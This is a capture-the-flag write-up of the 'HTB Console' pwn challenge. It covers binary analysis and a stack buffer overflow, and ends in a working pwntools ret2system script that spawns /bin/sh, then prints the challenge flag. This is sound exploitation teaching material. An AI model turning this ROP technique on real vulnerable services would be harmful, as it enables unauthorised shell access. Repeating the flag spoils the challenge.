# HTB Console
> Write-up author: jon-brandy
## DESCRIPTION:
Check out the all new HTB Console! Don't try to pwn it though.
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209944772-aa89cbe0-2fa5-46b1-9bf5-d0fd234b92c0.png)


2. Check the file type.

> RESULT - 64 bit binary file, stripped(we can't see the functions names)

![image](https://user-images.githubusercontent.com/70703371/209944817-b8dcd94f-e8ac-435d-abe8-d26388dce72b.png)


3. Now, check the binary's protection.

> RESULT - PARTIAL RELRO, NO CANARY FOUND, NO PIE

![image](https://user-images.githubusercontent.com/70703371/210139865-37dd05ac-e900-4ce2-b3a3-47bc8dc43c22.png)


4. Let's decompile the binary using ghidra.
5. When checking every function available, this function seems will be our interest.

![image](https://user-images.githubusercontent.com/70703371/210139951-0bcccbdb-04ec-4402-9806-687d9945d14b.png)


6. Based from it, seems we can do bufferoverflow the local_18 variable then put in the new return address. 
7. Notice there's a system function.

![image](https://user-images.githubusercontent.com/70703371/210140151-482a2d08-367d-4a09-b810-854d971303e3.png)


8. Not only that, we can utilize this one to write to memory.

![image](https://user-images.githubusercontent.com/70703371/210140219-d9820444-9cfc-4c61-abca-9a80ba6d64b2.png)


![image](https://user-images.githubusercontent.com/70703371/210140236-d52a8aa7-f7b1-4cb9-a9d1-70c19e0a5f13.png)


9. Since **NX Enabled**, hence it's useless to inject shellcode. So the attack concept we may use here is `ret2system`.
10. So we need to:

```
- Find the offset of RIP/EIP first.
- Then overflow the buffer of local_18 so we can write the system address of the system function.
- And pass in as a parameter the strings that we've written to the &DAT_004040b0 (data section).
```


11. Now let's make the file executeable by run `chmod`. Then run the file in gdb.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210140500-d01fa362-9d91-4e29-9ef4-75653f87c7e0.png)


12. Enter "flag".

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210140506-9c5728fc-b4ca-4f0a-a8c5-db49fd666a35.png)


13. Enter 300 cyclic pattern.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210140540-97ef0523-a031-4e84-94c5-1150507809c3.png)


14. Find the offset of RIP/EIP by copy the first 4 characters in RSP.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210140574-36436338-370e-40e4-b641-01745f718e51.png)


15. Great now we know the offset is 24 bytes.
16. Anyway to make sure every string we enter are send to the data, let's run the binary in gdb again, but this time enter the first input as `hof` and let's set the breakpoint at this offset.

![image](https://user-images.githubusercontent.com/70703371/210140686-3653ea17-964a-4d05-bcf0-644ab8060c4b.png)


![image](https://user-images.githubusercontent.com/70703371/210140696-82039b1e-8f16-4613-b6c3-cd12b51c89f2.png)


> STEPS - I USED GDB-PWNDBG THIS TIME

![image](https://user-images.githubusercontent.com/70703371/210140791-123629c6-c663-4445-9420-21ce882a5127.png)

- Press ctrl + c

![image](https://user-images.githubusercontent.com/70703371/210140807-d8793c6e-f3d2-4fb7-9990-38557b010c26.png)

- Type this:

```
x/8s 0x004040b0
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210140834-e3831145-9892-4ce3-94cf-01b9a1becacb.png)


17. Yepp, it's written there and we have more room there, so it's let us to input `cat flag.txt` etc.
18. Now let's find the offset of system func.

> RESULT - SWITCH TO GDB-PEDA AGAIN, HOWEVER U CAN USE THE SAME COMMAND IN GDB-PWNDBG

![image](https://user-images.githubusercontent.com/70703371/210141064-541e4ae0-5880-4904-b230-2b93d119485d.png)


19. Next we need the **pop rdi**, because the binary is in 64 bit, so the calling convention is if we want to call the system function we need to pop the parameter that we want to pass the system. So since we want to call `system("bin/sh")`, then we need to pop the `bin/sh` string into the **RDI** register.

> POP RDI

```sh
ropper --file htb-console --search "pop rdi"
```

![image](https://user-images.githubusercontent.com/70703371/210141290-3a363f23-e86f-4992-9e54-34f0f1f35646.png)


20. Let's combine all of it to the script.

> THE SCRIPT (RET2SYSTEM)

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './htb-console'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

ripEipoffset = 24 
systemAddr = 0x401040 # can grep it with elf.symbols.system
firstLinedatAddr = 0x4040b0 # first memory of dat
popRdi_offset = 0x401473 # pop rdi offset
p = flat(
    {ripEipoffset: [
        popRdi_offset,
        firstLinedatAddr,
        systemAddr
    ]}
)

sh.sendlineafter('>>', 'hof')
sh.sendlineafter(':','/bin/sh') # fill the dat with /bin/sh string

sh.sendlineafter('>>', 'flag')
sh.sendlineafter(':',p)

sh.interactive()
```

21. Let's run it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210146094-6d7702d0-bf05-4fe5-ad21-487910484992.png)


![image](https://user-images.githubusercontent.com/70703371/210146151-338560d5-dd79-4090-a1d1-6717884e4b59.png)


![image](https://user-images.githubusercontent.com/70703371/210146417-10975eab-d9b3-49f3-8ce2-7b50536dabaa.png)


22. Got the flag!

## FLAG

```
HTB{fl@g_a$_a_s3rv1c3?}
```


